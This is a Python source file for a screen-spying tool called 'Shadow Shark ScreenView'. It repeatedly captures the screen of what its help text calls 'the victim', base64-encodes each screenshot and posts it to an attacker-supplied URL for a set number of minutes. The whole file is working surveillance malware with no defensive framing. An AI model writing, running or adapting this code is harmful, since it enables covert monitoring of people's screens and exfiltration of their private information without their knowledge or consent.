# -*- coding: utf-8 -*-
"""
The Shadow Shark ScreenView library.

@author: Mr. Shark Spam Bot
"""
import io
import argparse
import time
import urllib.request
import codecs
from PIL import ImageGrab

def get_arguments():
    '''Get the time.'''
    parser = argparse.ArgumentParser(description='''The Shadow Shark ScreenView library.''')
    parser.add_argument('-t', '--time', dest='time', required=True, type=int,
                        help="The amount of time to view the victim's screen in minutes.")
    parser.add_argument('-u', '--url', dest='url', required=True, type=str,
                        help='The url to send the screenshot to.')
    options = parser.parse_args()
    seconds = options.time
    url = options.url
    return [seconds, url]

def send_screenshot():
    '''Get screenshot and send to website.'''
    screenshot = ImageGrab.grab()
    buffer = io.BytesIO()
    screenshot.save(buffer, 'PNG')
    screenshot = buffer.getvalue()
    screenshot = codecs.encode(screenshot, encoding='base64')
    url = arguments[1]
    post = urllib.request.urlopen(url, data=b'data:image/png;base64,' + screenshot)
    post.close()

def main():
    '''Do what send_screenshot does but for x amount of seconds.'''
    seconds = arguments[0]
    minutes =  seconds * 60
    end_time = time.time() + minutes
    try:
        print('[+] Running ScreenView.')
        while time.time() < end_time:
            send_screenshot()
    except:
        print('[-] ScreenView Crashed.')

if __name__ == '__main__':
    arguments = get_arguments()
    main()
